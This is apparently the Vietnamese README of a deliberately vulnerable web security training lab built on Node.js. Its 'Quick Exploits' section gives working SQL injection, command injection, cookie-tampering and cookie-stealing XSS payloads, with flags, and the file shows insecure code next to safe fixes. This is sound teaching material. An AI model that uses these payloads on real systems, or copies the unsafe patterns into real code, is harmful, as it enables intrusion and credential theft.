# 🔐 Security Lab - Web Security Practice

Dự án web để thực hành các kỹ thuật bảo mật và tấn công web trong môi trường kiểm soát.

## 🚀 Quick Start

```bash
# Cài đặt
npm install

# Chạy với cấu trúc mới (khuyến nghị)
node server-new.js

# Hoặc cấu trúc cũ
node server.js

# Truy cập
open http://localhost:3000
```

## 📚 Documentation

📖 **Tài liệu đầy đủ**: [docs/README.md](./docs/README.md)

### 🧪 Security Labs

-   **[SQL Injection Lab](./docs/labs/sql-injection.md)** - Thực hành SQL Injection
-   **[Command Injection Lab](./docs/labs/command-injection.md)** - Thực hành Command Injection
-   **[Authentication Bypass Lab](./docs/labs/authentication-bypass.md)** - Thực hành vượt qua xác thực
-   **[XSS Lab](./docs/labs/xss.md)** - Thực hành Cross-Site Scripting

### 📖 Guides

-   **[Quick Start](./docs/guides/quickstart.md)** - Bắt đầu nhanh
-   **[Architecture](./docs/guides/architecture.md)** - Kiến trúc hệ thống

## 🎯 Tính Năng Chính

### 🔍 Security Labs

-   **SQL Injection Lab** (`/lab/sqli`) - Khai thác lỗ hổng SQL Injection
-   **Command Injection Lab** (`/lab/cmdi`) - Khai thác lỗ hổng Command Injection
-   **Authentication Bypass Lab** (`/lab/auth`) - Vượt qua xác thực và XSS
-   **XSS Lab** - Cross-Site Scripting với Chrome automation

### 🌟 Tính Năng Đặc Biệt

-   **🌐 Chrome Auto-Login** - Tự động mở Chrome khi phát hiện XSS
-   **🔄 Auto-Reset** - Tự động reset comments khi về trang chủ
-   **📸 Screenshot** - Chụp ảnh màn hình khi XSS execute
-   **🚨 Real-time Detection** - Phát hiện XSS patterns real-time

## 🏗️ Cấu Trúc Dự Án

### Cấu Trúc Mới (MVC)

```
src/
├── config/          # Cấu hình
├── controllers/     # Business logic
├── models/          # Data models
├── routes/          # Route definitions
├── middleware/      # Middleware functions
├── services/        # Business services
└── app.js          # Main application
```

### Cấu Trúc Cũ (Monolithic)

```
server.js           # Main server file
browser-automation.js # Chrome automation
views/              # EJS templates
public/             # Static assets
```

## 🎯 Quick Exploits

### SQL Injection

```bash
# Tìm kiếm: ' UNION SELECT id, flag FROM secret--
# FLAG: FLAG{SQL_1nj3ct10n_M4st3r}
```

### Command Injection

```bash
# Ping: 8.8.8.8; cat secret.txt
# FLAG: FLAG{C0mm4nd_1nj3ct10n_M4st3r_2024}
```

### Authentication Bypass

```bash
# 1. Login: user1 / password1
# 2. F12 → Application → Cookies → Sửa auth thành admin:admin123
# 3. Refresh → FLAG: FLAG{4uth_Byp4ss_C00k13_H4ck}
```

### XSS + Session Hijacking

```html
<!-- Post comment: -->
<script>
    fetch("/api/steal?cookie=" + document.cookie);
</script>
<!-- Chrome sẽ tự động mở và trigger XSS! -->
```

## 🗄️ Database Schema

### Bảng `posts` (5 records)

```sql
id | title                           | content
1  | Chào mừng đến với Security Lab  | Đây là bài viết đầu tiên
2  | SQL Injection là gì?            | SQL Injection là một kỹ thuật tấn công...
3  | Bảo mật web căn bản             | Các nguyên tắc bảo mật cơ bản
4  | OWASP Top 10                    | Danh sách 10 lỗ hổng phổ biến nhất
5  | Cross-Site Scripting (XSS)      | Tấn công XSS hoạt động như thế nào
```

### Bảng `users` (3 users)

```sql
id | username | password  | email
1  | admin    | admin123  | admin@lab.local
2  | user1    | password1 | user1@lab.local
3  | user2    | password2 | user2@lab.local
```

### Bảng `secret` (1 flag)

```sql
id | flag                           | description
1  | FLAG{SQL_1nj3ct10n_M4st3r}    | Bí mật của hệ thống
```

### Bảng `comments` (4 comments)

```sql
id | username | comment
1  | admin    | Chào mừng đến với hệ thống!
2  | admin    | 🚩 FLAG: FLAG{4uth_Byp4ss_C00k13_H4ck} - Chỉ admin mới thấy được!
3  | user1    | Tính năng rất hay!
4  | user2    | Mình đã đăng nhập thành công!
```

## 🛠️ Tech Stack

-   **Backend**: Node.js + Express
-   **Database**: SQLite3
-   **Template Engine**: EJS
-   **Frontend**: HTML, CSS, Vanilla JavaScript
-   **Automation**: Puppeteer (Chrome)
-   **Architecture**: MVC + Service Layer

## ⚠️ Lưu Ý Bảo Mật

-   Dự án này được thiết kế **CÓ LỖ HỔNG** cho mục đích học tập
-   **KHÔNG** sử dụng code này trong môi trường production
-   Chỉ sử dụng cho mục đích nghiên cứu và học tập
-   Tất cả lỗ hổng đều được thiết kế cố tình

## 🎓 Mục Đích Giáo Dục

Dự án này giúp:

-   ✅ Hiểu cách hoạt động của các lỗ hổng bảo mật phổ biến
-   ✅ Nhận biết code không an toàn
-   ✅ Học cách khai thác lỗ hổng bảo mật
-   ✅ Áp dụng kiến thức để viết code an toàn hơn
-   ✅ Trải nghiệm real-world attack scenarios

## 🔒 Code An Toàn

Để viết code an toàn, **LUÔN** sử dụng:

### SQL Injection Prevention

```javascript
// ❌ KHÔNG AN TOÀN
const query = `SELECT * FROM posts WHERE title LIKE '%${searchTerm}%'`;

// ✅ AN TOÀN
const query = `SELECT * FROM posts WHERE title LIKE ?`;
db.all(query, [`%${searchTerm}%`], callback);
```

### Command Injection Prevention

```javascript
// ❌ KHÔNG AN TOÀN
exec(`ping ${ip}`, callback);

// ✅ AN TOÀN
execFile("ping", ["-c", "4", ip], callback);
```

### XSS Prevention

```javascript
// ❌ KHÔNG AN TOÀN
<%- comment %>

// ✅ AN TOÀN
<%= comment %>
```

### Authentication Security

```javascript
// ❌ KHÔNG AN TOÀN
res.cookie("auth", `${username}:${password}`);

// ✅ AN TOÀN
const token = jwt.sign({ userId: user.id }, secret);
res.cookie("token", token, { httpOnly: true });
```

## 📊 So Sánh: Cũ vs Mới

| Tính năng             | Cấu trúc cũ         | Cấu trúc mới              |
| --------------------- | ------------------- | ------------------------- |
| **Architecture**      | Monolithic          | MVC + Service Layer       |
| **Maintainability**   | Khó bảo trì         | Dễ bảo trì                |
| **Scalability**       | Khó mở rộng         | Dễ mở rộng                |
| **Testability**       | Khó test            | Dễ test                   |
| **Code Organization** | Tất cả trong 1 file | Tách riêng theo chức năng |
| **Documentation**     | Cơ bản              | Đầy đủ và chi tiết        |

## 🚀 Migration Guide

### Từ Cấu Trúc Cũ Sang Mới

1. **Backup**: Sao lưu `server.js` cũ
2. **Test**: Chạy `server-new.js`
3. **Verify**: Kiểm tra tất cả tính năng
4. **Replace**: Thay thế nếu ổn định
5. **Cleanup**: Xóa code cũ không cần thiết

## 📞 Hỗ Trợ

Nếu gặp vấn đề:

1. Kiểm tra [Troubleshooting Guide](./docs/guides/troubleshooting.md)
2. Xem [FAQ](./docs/guides/faq.md)
3. Tạo issue trên GitHub

## 📝 Changelog

### Version 2.0.0 (2025-01-16)

-   ✨ Cấu trúc MVC mới
-   📚 Documentation đầy đủ
-   🔧 Improved code organization
-   🛡️ Enhanced security features

### Version 1.4.0 (2025-01-15)

-   🌐 Chrome Auto-Login feature
-   📸 Screenshot automation
-   🔄 Auto-reset comments
-   🚨 Real-time XSS detection

---

**Made for educational purposes** 🎓

**Version**: 2.0.0  
**Last Updated**: 2025-01-16  
**Maintainer**: Security Lab Team
